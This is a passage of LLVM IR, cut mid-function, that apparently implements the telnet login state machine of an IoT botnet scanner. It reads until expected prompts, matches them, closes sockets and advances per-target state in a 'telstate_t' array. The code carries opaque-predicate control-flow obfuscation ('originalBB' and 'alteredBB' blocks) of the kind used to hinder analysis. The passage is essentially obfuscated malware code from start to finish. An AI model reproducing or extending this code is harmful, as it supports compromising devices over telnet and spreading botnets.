  %2190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2189, i32 0, i32 2
  store i8 0, i8* %2190, align 8
  %2191 = load i32, i32* %2, align 4
  %2192 = sext i32 %2191 to i64
  %2193 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2192
  %2194 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2193, i32 0, i32 3
  store i8 1, i8* %2194, align 1
  br label %2959

; <label>:2195:                                   ; preds = %2167
  %2196 = load i32, i32* %2, align 4
  %2197 = sext i32 %2196 to i64
  %2198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2197
  %2199 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2198, i32 0, i32 2
  store i8 7, i8* %2199, align 8
  br label %2200

; <label>:2200:                                   ; preds = %2195
  %2201 = load i32, i32* %2, align 4
  %2202 = sext i32 %2201 to i64
  %2203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2202
  %2204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2203, i32 0, i32 8
  %2205 = load i8*, i8** %2204, align 8
  call void @llvm.memset.p0i8.i64(i8* %2205, i8 0, i64 1024, i32 1, i1 false)
  br label %2959

; <label>:2206:                                   ; preds = %2112
  %2207 = load i32, i32* %2, align 4
  %2208 = sext i32 %2207 to i64
  %2209 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2208
  %2210 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2209, i32 0, i32 0
  %2211 = load i32, i32* %2210, align 16
  %2212 = load i32, i32* %2, align 4
  %2213 = sext i32 %2212 to i64
  %2214 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2213
  %2215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2214, i32 0, i32 8
  %2216 = load i8*, i8** %2215, align 8
  %2217 = load i32, i32* %2, align 4
  %2218 = sext i32 %2217 to i64
  %2219 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2218
  %2220 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2219, i32 0, i32 7
  %2221 = load i16, i16* %2220, align 16
  %2222 = zext i16 %2221 to i32
  %2223 = call i32 @readUntil(i32 %2211, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %2216, i32 1024, i32 %2222)
  %2224 = icmp ne i32 %2223, 0
  br i1 %2224, label %2225, label %2300

; <label>:2225:                                   ; preds = %2206
  %2226 = load i32, i32* %2, align 4
  %2227 = sext i32 %2226 to i64
  %2228 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2227
  %2229 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2228, i32 0, i32 6
  store i32 0, i32* %2229, align 4
  %2230 = load i32, i32* %2, align 4
  %2231 = sext i32 %2230 to i64
  %2232 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2231
  %2233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2232, i32 0, i32 7
  store i16 0, i16* %2233, align 16
  %2234 = load i32, i32* %2, align 4
  %2235 = sext i32 %2234 to i64
  %2236 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2235
  %2237 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2236, i32 0, i32 8
  %2238 = load i8*, i8** %2237, align 8
  %2239 = call i8* @strstr(i8* %2238, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i32 0, i32 0)) #10
  %2240 = icmp ne i8* %2239, null
  br i1 %2240, label %2241, label %2261

; <label>:2241:                                   ; preds = %2225
  %2242 = load i32, i32* %2, align 4
  %2243 = sext i32 %2242 to i64
  %2244 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2243
  %2245 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2244, i32 0, i32 8
  %2246 = load i8*, i8** %2245, align 8
  call void @llvm.memset.p0i8.i64(i8* %2246, i8 0, i64 1024, i32 1, i1 false)
  %2247 = load i32, i32* %2, align 4
  %2248 = sext i32 %2247 to i64
  %2249 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2248
  %2250 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2249, i32 0, i32 0
  %2251 = load i32, i32* %2250, align 16
  %2252 = call i32 @sclose(i32 %2251)
  %2253 = load i32, i32* %2, align 4
  %2254 = sext i32 %2253 to i64
  %2255 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2254
  %2256 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2255, i32 0, i32 2
  store i8 0, i8* %2256, align 8
  %2257 = load i32, i32* %2, align 4
  %2258 = sext i32 %2257 to i64
  %2259 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2258
  %2260 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2259, i32 0, i32 3
  store i8 0, i8* %2260, align 1
  br label %2959

; <label>:2261:                                   ; preds = %2225
  %2262 = load i32, i32* %2, align 4
  %2263 = sext i32 %2262 to i64
  %2264 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2263
  %2265 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2264, i32 0, i32 8
  %2266 = load i8*, i8** %2265, align 8
  %2267 = call i32 @matchPrompt(i8* %2266)
  %2268 = icmp ne i32 %2267, 0
  br i1 %2268, label %2289, label %2269

; <label>:2269:                                   ; preds = %2261
  %2270 = load i32, i32* %2, align 4
  %2271 = sext i32 %2270 to i64
  %2272 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2271
  %2273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2272, i32 0, i32 8
  %2274 = load i8*, i8** %2273, align 8
  call void @llvm.memset.p0i8.i64(i8* %2274, i8 0, i64 1024, i32 1, i1 false)
  %2275 = load i32, i32* %2, align 4
  %2276 = sext i32 %2275 to i64
  %2277 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2276
  %2278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2277, i32 0, i32 0
  %2279 = load i32, i32* %2278, align 16
  %2280 = call i32 @sclose(i32 %2279)
  %2281 = load i32, i32* %2, align 4
  %2282 = sext i32 %2281 to i64
  %2283 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2282
  %2284 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2283, i32 0, i32 2
  store i8 0, i8* %2284, align 8
  %2285 = load i32, i32* %2, align 4
  %2286 = sext i32 %2285 to i64
  %2287 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2286
  %2288 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2287, i32 0, i32 3
  store i8 1, i8* %2288, align 1
  br label %2959

; <label>:2289:                                   ; preds = %2261
  %2290 = load i32, i32* %2, align 4
  %2291 = sext i32 %2290 to i64
  %2292 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2291
  %2293 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2292, i32 0, i32 2
  store i8 7, i8* %2293, align 8
  br label %2294

; <label>:2294:                                   ; preds = %2289
  %2295 = load i32, i32* %2, align 4
  %2296 = sext i32 %2295 to i64
  %2297 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2296
  %2298 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2297, i32 0, i32 8
  %2299 = load i8*, i8** %2298, align 8
  call void @llvm.memset.p0i8.i64(i8* %2299, i8 0, i64 1024, i32 1, i1 false)
  br label %2959

; <label>:2300:                                   ; preds = %2206
  %2301 = load i32, i32* %2, align 4
  %2302 = sext i32 %2301 to i64
  %2303 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2302
  %2304 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2303, i32 0, i32 0
  %2305 = load i32, i32* %2304, align 16
  %2306 = load i32, i32* %2, align 4
  %2307 = sext i32 %2306 to i64
  %2308 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2307
  %2309 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2308, i32 0, i32 8
  %2310 = load i8*, i8** %2309, align 8
  %2311 = load i32, i32* %2, align 4
  %2312 = sext i32 %2311 to i64
  %2313 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2312
  %2314 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2313, i32 0, i32 7
  %2315 = load i16, i16* %2314, align 16
  %2316 = zext i16 %2315 to i32
  %2317 = call i32 @readUntil(i32 %2305, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %2310, i32 1024, i32 %2316)
  %2318 = icmp ne i32 %2317, 0
  br i1 %2318, label %2319, label %2410

; <label>:2319:                                   ; preds = %2300
  %2320 = load i32, i32* %2, align 4
  %2321 = sext i32 %2320 to i64
  %2322 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2321
  %2323 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2322, i32 0, i32 6
  store i32 0, i32* %2323, align 4
  %2324 = load i32, i32* %2, align 4
  %2325 = sext i32 %2324 to i64
  %2326 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2325
  %2327 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2326, i32 0, i32 7
  store i16 0, i16* %2327, align 16
  %2328 = load i32, i32* %2, align 4
  %2329 = sext i32 %2328 to i64
  %2330 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2329
  %2331 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2330, i32 0, i32 8
  %2332 = load i8*, i8** %2331, align 8
  %2333 = call i8* @strstr(i8* %2332, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i32 0, i32 0)) #10
  %2334 = icmp ne i8* %2333, null
  br i1 %2334, label %2335, label %2355

; <label>:2335:                                   ; preds = %2319
  %2336 = load i32, i32* %2, align 4
  %2337 = sext i32 %2336 to i64
  %2338 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2337
  %2339 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2338, i32 0, i32 8
  %2340 = load i8*, i8** %2339, align 8
  call void @llvm.memset.p0i8.i64(i8* %2340, i8 0, i64 1024, i32 1, i1 false)
  %2341 = load i32, i32* %2, align 4
  %2342 = sext i32 %2341 to i64
  %2343 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2342
  %2344 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2343, i32 0, i32 0
  %2345 = load i32, i32* %2344, align 16
  %2346 = call i32 @sclose(i32 %2345)
  %2347 = load i32, i32* %2, align 4
  %2348 = sext i32 %2347 to i64
  %2349 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2348
  %2350 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2349, i32 0, i32 2
  store i8 0, i8* %2350, align 8
  %2351 = load i32, i32* %2, align 4
  %2352 = sext i32 %2351 to i64
  %2353 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2352
  %2354 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2353, i32 0, i32 3
  store i8 0, i8* %2354, align 1
  br label %2959

; <label>:2355:                                   ; preds = %2319
  %2356 = load i32, i32* %2, align 4
  %2357 = sext i32 %2356 to i64
  %2358 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2357
  %2359 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2358, i32 0, i32 8
  %2360 = load i8*, i8** %2359, align 8
  %2361 = call i32 @matchPrompt(i8* %2360)
  %2362 = icmp ne i32 %2361, 0
  br i1 %2362, label %2399, label %2363

; <label>:2363:                                   ; preds = %2355
  %2364 = load i32, i32* @x.63
  %2365 = load i32, i32* @y.64
  %2366 = sub i32 %2364, 1
  %2367 = mul i32 %2364, %2366
  %2368 = urem i32 %2367, 2
  %2369 = icmp eq i32 %2368, 0
  %2370 = icmp slt i32 %2365, 10
  %2371 = or i1 %2369, %2370
  br i1 %2371, label %originalBB212, label %originalBB212alteredBB

originalBB212:                                    ; preds = %originalBB212alteredBB, %2363
  %2372 = load i32, i32* %2, align 4
  %2373 = sext i32 %2372 to i64
  %2374 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2373
  %2375 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2374, i32 0, i32 8
  %2376 = load i8*, i8** %2375, align 8
  call void @llvm.memset.p0i8.i64(i8* %2376, i8 0, i64 1024, i32 1, i1 false)
  %2377 = load i32, i32* %2, align 4
  %2378 = sext i32 %2377 to i64
  %2379 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2378
  %2380 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2379, i32 0, i32 0
  %2381 = load i32, i32* %2380, align 16
  %2382 = call i32 @sclose(i32 %2381)
  %2383 = load i32, i32* %2, align 4
  %2384 = sext i32 %2383 to i64
  %2385 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2384
  %2386 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2385, i32 0, i32 2
  store i8 0, i8* %2386, align 8
  %2387 = load i32, i32* %2, align 4
  %2388 = sext i32 %2387 to i64
  %2389 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2388
  %2390 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2389, i32 0, i32 3
  store i8 1, i8* %2390, align 1
  %2391 = load i32, i32* @x.63
  %2392 = load i32, i32* @y.64
  %2393 = sub i32 %2391, 1
  %2394 = mul i32 %2391, %2393
  %2395 = urem i32 %2394, 2
  %2396 = icmp eq i32 %2395, 0
  %2397 = icmp slt i32 %2392, 10
  %2398 = or i1 %2396, %2397
  br i1 %2398, label %originalBBpart2214, label %originalBB212alteredBB

originalBBpart2214:                               ; preds = %originalBB212
  br label %2959

; <label>:2399:                                   ; preds = %2355
  %2400 = load i32, i32* %2, align 4
  %2401 = sext i32 %2400 to i64
  %2402 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2401
  %2403 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2402, i32 0, i32 2
  store i8 7, i8* %2403, align 8
  br label %2404

; <label>:2404:                                   ; preds = %2399
  %2405 = load i32, i32* %2, align 4
  %2406 = sext i32 %2405 to i64
  %2407 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2406
  %2408 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2407, i32 0, i32 8
  %2409 = load i8*, i8** %2408, align 8
  call void @llvm.memset.p0i8.i64(i8* %2409, i8 0, i64 1024, i32 1, i1 false)
  br label %2959

; <label>:2410:                                   ; preds = %2300
  %2411 = load i32, i32* %2, align 4
  %2412 = sext i32 %2411 to i64
  %2413 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2412
  %2414 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2413, i32 0, i32 0
  %2415 = load i32, i32* %2414, align 16
  %2416 = load i32, i32* %2, align 4
  %2417 = sext i32 %2416 to i64
  %2418 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2417
  %2419 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2418, i32 0, i32 8
  %2420 = load i8*, i8** %2419, align 8
  %2421 = load i32, i32* %2, align 4
  %2422 = sext i32 %2421 to i64
  %2423 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2422
  %2424 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2423, i32 0, i32 7
  %2425 = load i16, i16* %2424, align 16
  %2426 = zext i16 %2425 to i32
  %2427 = call i32 @readUntil(i32 %2415, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %2420, i32 1024, i32 %2426)
  %2428 = icmp ne i32 %2427, 0
  br i1 %2428, label %2429, label %2520

; <label>:2429:                                   ; preds = %2410
  %2430 = load i32, i32* %2, align 4
  %2431 = sext i32 %2430 to i64
  %2432 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2431
  %2433 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2432, i32 0, i32 6
  store i32 0, i32* %2433, align 4
  %2434 = load i32, i32* %2, align 4
  %2435 = sext i32 %2434 to i64
  %2436 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2435
  %2437 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2436, i32 0, i32 7
  store i16 0, i16* %2437, align 16
  %2438 = load i32, i32* %2, align 4
  %2439 = sext i32 %2438 to i64
  %2440 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2439
  %2441 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2440, i32 0, i32 8
  %2442 = load i8*, i8** %2441, align 8
  %2443 = call i8* @strstr(i8* %2442, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0)) #10
  %2444 = icmp ne i8* %2443, null
  br i1 %2444, label %2445, label %2465

; <label>:2445:                                   ; preds = %2429
  %2446 = load i32, i32* %2, align 4
  %2447 = sext i32 %2446 to i64
  %2448 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2447
  %2449 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2448, i32 0, i32 8
  %2450 = load i8*, i8** %2449, align 8
  call void @llvm.memset.p0i8.i64(i8* %2450, i8 0, i64 1024, i32 1, i1 false)
  %2451 = load i32, i32* %2, align 4
  %2452 = sext i32 %2451 to i64
  %2453 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2452
  %2454 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2453, i32 0, i32 0
  %2455 = load i32, i32* %2454, align 16
  %2456 = call i32 @sclose(i32 %2455)
  %2457 = load i32, i32* %2, align 4
  %2458 = sext i32 %2457 to i64
  %2459 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2458
  %2460 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2459, i32 0, i32 2
  store i8 0, i8* %2460, align 8
  %2461 = load i32, i32* %2, align 4
  %2462 = sext i32 %2461 to i64
  %2463 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2462
  %2464 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2463, i32 0, i32 3
  store i8 0, i8* %2464, align 1
  br label %2959

; <label>:2465:                                   ; preds = %2429
  %2466 = load i32, i32* %2, align 4
  %2467 = sext i32 %2466 to i64
  %2468 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2467
  %2469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2468, i32 0, i32 8
  %2470 = load i8*, i8** %2469, align 8
  %2471 = call i32 @matchPrompt(i8* %2470)
  %2472 = icmp ne i32 %2471, 0
  br i1 %2472, label %2509, label %2473

; <label>:2473:                                   ; preds = %2465
  %2474 = load i32, i32* @x.63
  %2475 = load i32, i32* @y.64
  %2476 = sub i32 %2474, 1
  %2477 = mul i32 %2474, %2476
  %2478 = urem i32 %2477, 2
  %2479 = icmp eq i32 %2478, 0
  %2480 = icmp slt i32 %2475, 10
  %2481 = or i1 %2479, %2480
  br i1 %2481, label %originalBB216, label %originalBB216alteredBB

originalBB216:                                    ; preds = %originalBB216alteredBB, %2473
  %2482 = load i32, i32* %2, align 4
  %2483 = sext i32 %2482 to i64
  %2484 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2483
  %2485 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2484, i32 0, i32 8
  %2486 = load i8*, i8** %2485, align 8
  call void @llvm.memset.p0i8.i64(i8* %2486, i8 0, i64 1024, i32 1, i1 false)
  %2487 = load i32, i32* %2, align 4
  %2488 = sext i32 %2487 to i64
  %2489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2488
  %2490 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2489, i32 0, i32 0
  %2491 = load i32, i32* %2490, align 16
  %2492 = call i32 @sclose(i32 %2491)
  %2493 = load i32, i32* %2, align 4
  %2494 = sext i32 %2493 to i64
  %2495 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2494
  %2496 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2495, i32 0, i32 2
  store i8 0, i8* %2496, align 8
  %2497 = load i32, i32* %2, align 4
  %2498 = sext i32 %2497 to i64
  %2499 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2498
  %2500 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2499, i32 0, i32 3
  store i8 1, i8* %2500, align 1
  %2501 = load i32, i32* @x.63
  %2502 = load i32, i32* @y.64
  %2503 = sub i32 %2501, 1
  %2504 = mul i32 %2501, %2503
  %2505 = urem i32 %2504, 2
  %2506 = icmp eq i32 %2505, 0
  %2507 = icmp slt i32 %2502, 10
  %2508 = or i1 %2506, %2507
  br i1 %2508, label %originalBBpart2218, label %originalBB216alteredBB

originalBBpart2218:                               ; preds = %originalBB216
  br label %2959

; <label>:2509:                                   ; preds = %2465
  %2510 = load i32, i32* %2, align 4
  %2511 = sext i32 %2510 to i64
  %2512 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2511
  %2513 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2512, i32 0, i32 2
  store i8 7, i8* %2513, align 8
  br label %2514

; <label>:2514:                                   ; preds = %2509
  %2515 = load i32, i32* %2, align 4
  %2516 = sext i32 %2515 to i64
  %2517 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2516
  %2518 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2517, i32 0, i32 8
  %2519 = load i8*, i8** %2518, align 8
  call void @llvm.memset.p0i8.i64(i8* %2519, i8 0, i64 1024, i32 1, i1 false)
  br label %2959

; <label>:2520:                                   ; preds = %2410
  %2521 = load i32, i32* @x.63
  %2522 = load i32, i32* @y.64
  %2523 = sub i32 %2521, 1
  %2524 = mul i32 %2521, %2523
  %2525 = urem i32 %2524, 2
  %2526 = icmp eq i32 %2525, 0
  %2527 = icmp slt i32 %2522, 10
  %2528 = or i1 %2526, %2527
  br i1 %2528, label %originalBB220, label %originalBB220alteredBB

originalBB220:                                    ; preds = %originalBB220alteredBB, %2520
  %2529 = load i32, i32* %2, align 4
  %2530 = sext i32 %2529 to i64
  %2531 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2530
  %2532 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2531, i32 0, i32 0
  %2533 = load i32, i32* %2532, align 16
  %2534 = load i32, i32* %2, align 4
  %2535 = sext i32 %2534 to i64
  %2536 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2535
  %2537 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2536, i32 0, i32 8
  %2538 = load i8*, i8** %2537, align 8
  %2539 = load i32, i32* %2, align 4
  %2540 = sext i32 %2539 to i64
  %2541 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2540
  %2542 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2541, i32 0, i32 7
  %2543 = load i16, i16* %2542, align 16
  %2544 = zext i16 %2543 to i32
  %2545 = call i32 @readUntil(i32 %2533, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %2538, i32 1024, i32 %2544)
  %2546 = icmp ne i32 %2545, 0
  %2547 = load i32, i32* @x.63
  %2548 = load i32, i32* @y.64
  %2549 = sub i32 %2547, 1
  %2550 = mul i32 %2547, %2549
  %2551 = urem i32 %2550, 2
  %2552 = icmp eq i32 %2551, 0
  %2553 = icmp slt i32 %2548, 10
  %2554 = or i1 %2552, %2553
  br i1 %2554, label %originalBBpart2222, label %originalBB220alteredBB

originalBBpart2222:                               ; preds = %originalBB220
  br i1 %2546, label %2555, label %2630

; <label>:2555:                                   ; preds = %originalBBpart2222
  %2556 = load i32, i32* %2, align 4
  %2557 = sext i32 %2556 to i64
  %2558 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2557
  %2559 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2558, i32 0, i32 6
  store i32 0, i32* %2559, align 4
  %2560 = load i32, i32* %2, align 4
  %2561 = sext i32 %2560 to i64
  %2562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2561
  %2563 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2562, i32 0, i32 7
  store i16 0, i16* %2563, align 16
  %2564 = load i32, i32* %2, align 4
  %2565 = sext i32 %2564 to i64
  %2566 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2565
  %2567 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2566, i32 0, i32 8
  %2568 = load i8*, i8** %2567, align 8
  %2569 = call i8* @strstr(i8* %2568, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i32 0, i32 0)) #10
  %2570 = icmp ne i8* %2569, null
  br i1 %2570, label %2571, label %2591

; <label>:2571:                                   ; preds = %2555
  %2572 = load i32, i32* %2, align 4
  %2573 = sext i32 %2572 to i64
  %2574 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2573
  %2575 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2574, i32 0, i32 8
  %2576 = load i8*, i8** %2575, align 8
  call void @llvm.memset.p0i8.i64(i8* %2576, i8 0, i64 1024, i32 1, i1 false)
  %2577 = load i32, i32* %2, align 4
  %2578 = sext i32 %2577 to i64
  %2579 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2578
  %2580 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2579, i32 0, i32 0
  %2581 = load i32, i32* %2580, align 16
  %2582 = call i32 @sclose(i32 %2581)
  %2583 = load i32, i32* %2, align 4
  %2584 = sext i32 %2583 to i64
  %2585 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2584
  %2586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2585, i32 0, i32 2
  store i8 0, i8* %2586, align 8
  %2587 = load i32, i32* %2, align 4
  %2588 = sext i32 %2587 to i64
  %2589 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2588
  %2590 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2589, i32 0, i32 3
  store i8 0, i8* %2590, align 1
  br label %2959

; <label>:2591:                                   ; preds = %2555
  %2592 = load i32, i32* %2, align 4
  %2593 = sext i32 %2592 to i64
  %2594 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2593
  %2595 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2594, i32 0, i32 8
  %2596 = load i8*, i8** %2595, align 8
  %2597 = call i32 @matchPrompt(i8* %2596)
  %2598 = icmp ne i32 %2597, 0
  br i1 %2598, label %2619, label %2599

; <label>:2599:                                   ; preds = %2591
  %2600 = load i32, i32* %2, align 4
  %2601 = sext i32 %2600 to i64
  %2602 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2601
  %2603 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2602, i32 0, i32 8
  %2604 = load i8*, i8** %2603, align 8
  call void @llvm.memset.p0i8.i64(i8* %2604, i8 0, i64 1024, i32 1, i1 false)
  %2605 = load i32, i32* %2, align 4
  %2606 = sext i32 %2605 to i64
  %2607 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2606
  %2608 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2607, i32 0, i32 0
  %2609 = load i32, i32* %2608, align 16
  %2610 = call i32 @sclose(i32 %2609)
  %2611 = load i32, i32* %2, align 4
  %2612 = sext i32 %2611 to i64
  %2613 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2612
  %2614 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2613, i32 0, i32 2
  store i8 0, i8* %2614, align 8
  %2615 = load i32, i32* %2, align 4
  %2616 = sext i32 %2615 to i64
  %2617 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2616
  %2618 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2617, i32 0, i32 3
  store i8 1, i8* %2618, align 1
  br label %2959

; <label>:2619:                                   ; preds = %2591
  %2620 = load i32, i32* %2, align 4
  %2621 = sext i32 %2620 to i64
  %2622 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2621
  %2623 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2622, i32 0, i32 2
  store i8 7, i8* %2623, align 8
  br label %2624

; <label>:2624:                                   ; preds = %2619
  %2625 = load i32, i32* %2, align 4
  %2626 = sext i32 %2625 to i64
  %2627 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2626
